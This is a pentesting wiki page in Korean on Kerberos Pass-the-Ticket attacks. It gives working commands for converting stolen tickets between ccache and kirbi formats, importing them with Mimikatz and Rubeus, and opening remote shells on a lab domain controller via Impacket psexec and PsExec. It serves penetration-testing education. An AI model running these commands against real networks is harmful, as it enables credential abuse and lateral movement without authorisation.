# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## 개요

Pass-the-Ticket (PtT) attack에서 adversary는 탈취한 Kerberos ticket을 사용하여 해당 ticket의 principal로 인증하며, 해당 account의 password를 보유할 필요가 없습니다. ticket-granting ticket (TGT)은 service ticket을 요청하는 데 사용할 수 있지만, 탈취한 service ticket은 대상 service와 유효 기간으로 사용이 제한됩니다.<sup>[[1]](#references)</sup>

ticket acquisition techniques는 다음을 참고하세요.

- [Windows에서 ticket 수집](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Linux에서 ticket 수집](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Linux 및 Windows Ticket 형식 변환

Kerberos cache는 일반적으로 Linux에서는 MIT `ccache` 파일로, Windows에서는 `.kirbi` 파일로 나타납니다. `ticket_converter`는 input ticket과 output path를 사용하여 이러한 형식 간 변환을 수행합니다.<sup>[[2]](#references)</sup>
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```
Kekeo는 Windows에서 Kerberos ticket 도구도 제공합니다.<sup>[[3]](#references)</sup>

## Ticket 사용

Linux에서는 `KRB5CCNAME`이 cache를 가리키도록 설정하고, Impacket client가 password를 묻지 않고 Kerberos를 사용하도록 지정합니다:<sup>[[4]](#references)</sup>
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
Windows에서는 Mimikatz 또는 Rubeus를 사용해 `.kirbi` ticket을 현재 logon session으로 import할 수 있습니다. `klist`를 사용해 생성된 cache를 확인합니다.<sup>[[5]](#references)[[6]](#references)</sup>
```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
Ticket 가져오기는 ticket에 명시된 권한과 대상 서비스의 authorization policy를 넘어서는 privileges를 부여하지 않습니다. 만료되었거나, revoked되었거나, 잘못 구성되었거나, scope가 잘못 지정된 ticket은 실패할 수 있습니다.<sup>[[1]](#references)</sup>

더 폭넓은 Kerberos attack context와 관련 ticket-acquisition techniques는 Tarlogic의 Kerberos 공격 가이드를 참조하세요.<sup>[[7]](#references)</sup>

## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Impacket 예제](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Kerberos 공격 기법](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
{{#include ../../banners/hacktricks-training.md}}
